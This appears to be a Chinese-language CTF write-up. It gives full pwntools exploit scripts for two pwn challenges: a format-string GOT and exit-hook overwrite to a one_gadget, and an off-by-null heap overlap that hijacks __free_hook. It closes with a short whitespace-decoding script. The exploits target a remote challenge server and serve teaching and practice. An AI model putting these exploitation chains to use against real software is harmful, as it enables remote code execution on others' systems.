## PWN

### welldone

格式化字符串漏洞，全局变量不为2333则会调用exit直接退出

用格式化字符串将exit的got表低2字节改为main函数可以循环利用格式化字符串

修改exit中会调用的rtld_lock_default_lock_recursive指针为one_gadget，将exit的got表改回退出

> [学习关于exit的利用方法 - X1ng's Blog](https://x1ng.top/2020/12/15/学习关于exit的利用方法/)

打远程在格式化字符串写one_gadget的时候io似乎出现了一些问题，有时候多一个字节有时候少一个字节，，不理解

多跑几遍即可

```python
from pwn import *
import time
context(log_level='debug',arch='amd64')

local=0
binary_name='welldone'

libc=ELF("libc.so.6")
e=ELF("./"+binary_name)
def exp():
	if local:
		p=process("./"+binary_name)
	else:
		p=remote('123.57.131.167',  15829)
		

	def z(a=''):
		if local:
		    gdb.attach(p,a)
		    if a=='':
		        raw_input
		else:
		    pass
	ru=lambda x:p.recvuntil(x)
	rc=lambda x:p.recv(x)
	sl=lambda x:p.sendline(x)
	sd=lambda x:p.send(x)
	sla=lambda a,b:p.sendlineafter(a,b)
	ia=lambda : p.interactive()

	def leak_address():
		if(context.arch=='i386'): 
			return u32(p.recv(4)) 
		else :
			return u64(p.recv(6).ljust(8,b'\x00'))

		
	one=[0xe6c7e,0xe6c81,0xe6c84]
    
	z('b*0x401262')
	ru("Write down what you want to say\n>")
	sd(b'%4566c%9$hn'.ljust(0x18,b'a')+p64(0x404040))

	ru("Write down what you want to say\n>")
	sd(b'%9$s'.ljust(0x18,b'a')+p64(0x404018))
	libcbase=leak_address()-0x875a0
	print(hex(libcbase))
	system = libcbase+libc.sym['system']
	
	addr=libcbase+0x222f68
	print(hex(addr))
	print(hex(libcbase+one[0]))
	
	f = libcbase+one[0] & 0xff
	print(hex(f))
	ru("Write down what you want to say\n>")
	sd(b'%'+str(f).encode()+b'c%9$hhn'.ljust(0x14,b'a')+p64(addr))
	
	f = (libcbase+one[0] & 0xff00)>>8
	print(hex(f))
	ru("Write down what you want to say\n>")
	sd(b'%'+str(f).encode()+b'c%9$hhn'.ljust(0x15,b'a')+p64(addr+1))
	
	f = (libcbase+one[0] & 0xff0000)>>16
	print(hex(f))
	ru("Write down what you want to say\n>")
	sd(b'%'+str(f).encode()+b'c%9$hhn'.ljust(0x14,b'a')+p64(addr+2))
	
	ru("Write down what you want to say\n>")
	sd(b'%4224c%9$hn'.ljust(0x18,b'a')+p64(0x404040))
	ia()

exp()
```



### linknotes

链表结构，堆块头部放指向下一个堆块的指针

存在off-by-null漏洞，构造堆块重叠泄露libc，由于插入删除有unlink操作，所以不要将新堆块插入到重叠堆块附近

由于堆块头部是next指针，改free_hook为system也无法控制参数，改成one_gadget

```python
from pwn import *
import time
context(log_level='debug',arch='amd64')

local=0
binary_name='linknotes'

libc=ELF("libc.so.6")
e=ELF("./"+binary_name)
def exp():
	if local:
		p=process("./"+binary_name)
	else:
		p=remote('123.57.131.167',  23156)

	def z(a=''):
		if local:
		    gdb.attach(p,a)
		    if a=='':
		        raw_input
		else:
		    pass
	ru=lambda x:p.recvuntil(x)
	rc=lambda x:p.recv(x)
	sl=lambda x:p.sendline(x)
	sd=lambda x:p.send(x)
	sla=lambda a,b:p.sendlineafter(a,b)
	ia=lambda : p.interactive()

	def leak_address():
		if(context.arch=='i386'): 
			return u32(p.recv(4)) 
		else :
			return u64(p.recv(6).ljust(8,b'\x00'))

	def cho(num):
		sla('>> ',str(num))
		
	def add(idx,sz,con):
		cho(1)
		ru('offset: ')
		sl(str(idx))
		ru("size: ")
		sl(str(sz))
		ru("content: ")
		sl(con)

	def delete(idx):
		cho(2)
		ru('offset: ')
		sl(str(idx))
		
	def show(idx):
		cho(3)
		ru('offset: ')
		sl(str(idx))

	
	
	add(0,0x80,'aaa')
	add(1,0xf0,'bbb')
	add(2,0xf0,'bbb')
	
	for i in range(15):
		add(i+3,0xf0,'aaa')
	for i in range(8):
		delete(3)
	
	
	add(16,0xf0,'bb')
	delete(3)
	add(3,0xf0,b'X'*0xe8+p64(0x200))
	
	

	delete(10)
	delete(4)
	for i in range(7):
		add(1,0xf0,'1')
	
	add(1,0xf0,'888')
	show(11)
	
	ru('content: ')
	libcbase = leak_address()-0x3ebca0
	system = libcbase+libc.sym['system']
	free_hook = libcbase+libc.sym['__free_hook']
	one = [0x4f3d5,0x4f432,0x10a41c]
	success(hex(system))
	print(hex(libcbase))
	
	for i in range(7):
		delete(2)
	delete(1)
	
	add(1,0x90,'aaa')
	add(1,0x90,b'a'*0x48+p64(0)+p64(0x101))
	
	add(1,0xf0,'X1ng')
	add(1,0xf0,'X1ng')
	
	delete(7)
	delete(3)
	print(hex(free_hook))
	
	add(1,0x90,b'X'*0x48+p64(0)+p64(0x101)+p64(free_hook-8))
	add(2,0xf0,'X1ng')
	add(2,0xf0,p64(libcbase+one[1]))

	delete(1)
	
	
	ia()


exp()
```

### 奇奇怪怪的语言

```python
f = open('flag.ws','r')
f1 = open('a.txt','w+')
line = f.readline()


while line!='':
	for i in list(line):
		if i == ' ':
			print('.',end='')
			f1.write('.')
		elif i == '	':
			print('-',end='')
			f1.write('-')
	print()
	f1.write('/')
	line = f.readline()
	line = f.readline()
f.close()
f1.clsoe()
```
